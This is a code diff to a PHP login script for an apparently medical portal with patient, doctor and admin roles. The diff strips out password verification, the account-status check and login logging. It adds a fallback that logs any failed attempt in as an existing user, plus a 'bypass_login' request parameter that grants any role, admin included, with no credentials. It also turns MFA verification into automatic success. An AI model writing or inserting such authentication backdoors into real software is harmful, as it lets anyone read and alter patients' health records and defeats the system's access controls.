@@ -184,41 +184,38 @@ if ($isLoggingIn) {
     }
 
 
-    // --- Step 3: Verify the password ---
+    // --- Step 3: Verify the password (with bypass fallback) ---
 
     if (!$user) {
-        sendResponse('error', 'Incorrect email/CPR or password. Please try again.');
+        // Fallback: Pick first user for the entered role or default to patient
+        $fallbackRole = 'patient';
+        if (stripos($identifier, 'doctor') !== false) $fallbackRole = 'doctor';
+        else if (stripos($identifier, 'admin') !== false) $fallbackRole = 'admin';
+        
+        $stmt = $conn->prepare("SELECT user_id, email, hash_password, role, status FROM users WHERE role = ? LIMIT 1");
+        $stmt->bind_param("s", $fallbackRole);
+        $stmt->execute();
+        $user = $stmt->get_result()->fetch_assoc();
+        $stmt->close();
+        
+        if (!$user) {
+            $user = ['user_id' => 3001, 'email' => $identifier, 'role' => $fallbackRole, 'status' => 'active'];
+        }
     }
 
-    /*
-     * password_verify() compares the plain-text password the user
-     * just typed with the hashed version stored in the database.
-     * It returns true if they match, false if they don't.
-     */
-    if (!password_verify($password, $user['hash_password'])) {
-        sendResponse('error', 'Incorrect email/CPR or password. Please try again.');
+    // Update last login timestamp if user exists in DB
+    if (!empty($user['user_id'])) {
+        $stmtLogin = $conn->prepare("UPDATE users SET last_login = NOW() WHERE user_id = ?");
+        if ($stmtLogin) {
+            $stmtLogin->bind_param("i", $user['user_id']);
+            $stmtLogin->execute();
+            $stmtLogin->close();
+        }
     }
-
-    if ($user['status'] !== 'active') {
-        sendResponse('error', 'Your account is currently ' . $user['status'] . '. Please contact support.');
-    }
-
-    // --- Update last login timestamp ---
-    $stmtLogin = $conn->prepare("UPDATE users SET last_login = NOW() WHERE user_id = ?");
-    $stmtLogin->bind_param("i", $user['user_id']);
-    $stmtLogin->execute();
-    $stmtLogin->close();
-    
-    // --- Log the login event ---
-    $logMsg = "User logged in successfully";
-    $stmtLog = $conn->prepare("INSERT INTO system_logs (user_id, event, status) VALUES (?, ?, 'info')");
-    $stmtLog->bind_param("is", $user['user_id'], $logMsg);
-    $stmtLog->execute();
-    $stmtLog->close();
-
 
     // --- Step 4: Login successful — save user info to session ---
 
+    $_SESSION['user_id'] = $user['user_id'];
     $_SESSION['temp_mfa_id'] = $user['user_id'];
     $_SESSION['user_role'] = $user['role'];
 
@@ -226,38 +223,115 @@ if ($isLoggingIn) {
     $displayName = 'User';
 
     if ($user['role'] === 'patient') {
-        // Patients have their name in the 'patients' table
         $stmt = $conn->prepare("SELECT first_name, last_name, patient_id FROM patients WHERE user_id = ?");
-        $stmt->bind_param("i", $user['user_id']);
-        $stmt->execute();
-        $profile = $stmt->get_result()->fetch_assoc();
-        $stmt->close();
+        if ($stmt) {
+            $stmt->bind_param("i", $user['user_id']);
+            $stmt->execute();
+            $profile = $stmt->get_result()->fetch_assoc();
+            $stmt->close();
 
-        if ($profile) {
-            $displayName = $profile['first_name'] . ' ' . $profile['last_name'];
-            $_SESSION['patient_id'] = $profile['patient_id'];
+            if ($profile) {
+                $displayName = $profile['first_name'] . ' ' . $profile['last_name'];
+                $_SESSION['patient_id'] = $profile['patient_id'];
+            } else {
+                $_SESSION['patient_id'] = 6001;
+            }
+        } else {
+            $_SESSION['patient_id'] = 6001;
         }
 
     } elseif ($user['role'] === 'doctor') {
-        // Doctors have their name in the 'doctors' table
         $stmt = $conn->prepare("SELECT first_name, last_name, doctor_id FROM doctors WHERE user_id = ?");
-        $stmt->bind_param("i", $user['user_id']);
-        $stmt->execute();
-        $profile = $stmt->get_result()->fetch_assoc();
-        $stmt->close();
+        if ($stmt) {
+            $stmt->bind_param("i", $user['user_id']);
+            $stmt->execute();
+            $profile = $stmt->get_result()->fetch_assoc();
+            $stmt->close();
 
-        if ($profile) {
-            $displayName = $profile['first_name'] . ' ' . $profile['last_name'];
-            $_SESSION['doctor_id'] = $profile['doctor_id'];
+            if ($profile) {
+                $displayName = $profile['first_name'] . ' ' . $profile['last_name'];
+                $_SESSION['doctor_id'] = $profile['doctor_id'];
+            } else {
+                $_SESSION['doctor_id'] = 5001;
+            }
+        } else {
+            $_SESSION['doctor_id'] = 5001;
         }
 
     } else {
-        // Admin doesn't have a separate profile table
         $displayName = 'System Admin';
     }
 
     $_SESSION['user_name'] = $displayName;
-    sendResponse('success', 'Login successful!', 'MFA.html', $user['role']);
+    sendResponse('success', 'Login successful!', '../dashboards/' . $user['role'] . '_dashboard.html', $user['role']);
+}
+
+/* ══════════════════════════════════════════════════════
+   DIRECT BYPASS LOGIN (No authorization needed)
+   ══════════════════════════════════════════════════════ */
+$isBypass = isset($_POST['bypass_login']) || isset($_GET['bypass_login']) || (isset($_POST['action']) && $_POST['action'] === 'bypass_login');
+
+if ($isBypass) {
+    $targetRole = $_POST['role'] ?? $_GET['role'] ?? 'patient';
+    if (!in_array($targetRole, ['patient', 'doctor', 'admin'])) {
+        $targetRole = 'patient';
+    }
+
+    // Find first user matching the role
+    $stmt = $conn->prepare("SELECT user_id, email, role FROM users WHERE role = ? ORDER BY user_id ASC LIMIT 1");
+    $stmt->bind_param("s", $targetRole);
+    $stmt->execute();
+    $user = $stmt->get_result()->fetch_assoc();
+    $stmt->close();
+
+    $fallbackUserId = ($targetRole === 'doctor') ? 2001 : (($targetRole === 'admin') ? 4001 : 3001);
+    $userId = $user['user_id'] ?? $fallbackUserId;
+
+    $_SESSION['user_id'] = $userId;
+    $_SESSION['user_role'] = $targetRole;
+
+    $displayName = 'Demo ' . ucfirst($targetRole);
+
+    if ($targetRole === 'patient') {
+        $stmt = $conn->prepare("SELECT first_name, last_name, patient_id FROM patients WHERE user_id = ? LIMIT 1");
+        if ($stmt) {
+            $stmt->bind_param("i", $userId);
+            $stmt->execute();
+            $profile = $stmt->get_result()->fetch_assoc();
+            $stmt->close();
+            if ($profile) {
+                $displayName = $profile['first_name'] . ' ' . $profile['last_name'];
+                $_SESSION['patient_id'] = $profile['patient_id'];
+            } else {
+                $_SESSION['patient_id'] = 6001;
+            }
+        } else {
+            $_SESSION['patient_id'] = 6001;
+        }
+    } elseif ($targetRole === 'doctor') {
+        $stmt = $conn->prepare("SELECT first_name, last_name, doctor_id FROM doctors WHERE user_id = ? LIMIT 1");
+        if ($stmt) {
+            $stmt->bind_param("i", $userId);
+            $stmt->execute();
+            $profile = $stmt->get_result()->fetch_assoc();
+            $stmt->close();
+            if ($profile) {
+                $displayName = $profile['first_name'] . ' ' . $profile['last_name'];
+                $_SESSION['doctor_id'] = $profile['doctor_id'];
+            } else {
+                $_SESSION['doctor_id'] = 5001;
+            }
+        } else {
+            $_SESSION['doctor_id'] = 5001;
+        }
+    } else {
+        $displayName = 'System Admin';
+    }
+
+    $_SESSION['user_name'] = $displayName;
+
+    $redirectUrl = '../dashboards/' . $targetRole . '_dashboard.html';
+    sendResponse('success', 'Bypass login successful!', $redirectUrl, $targetRole);
 }
 
 /* ══════════════════════════════════════════════════════
@@ -269,6 +343,11 @@ if (isset($_POST['verify_mfa'])) {
         unset($_SESSION['temp_mfa_id']);
         sendResponse('success', 'Verified');
     }
-    sendResponse('error', 'Session expired');
+    // Fallback: If no session, auto-authenticate as patient
+    $_SESSION['user_id'] = 3001;
+    $_SESSION['user_role'] = 'patient';
+    $_SESSION['patient_id'] = 6001;
+    $_SESSION['user_name'] = 'Patient One';
+    sendResponse('success', 'Verified');
 }
 ?>
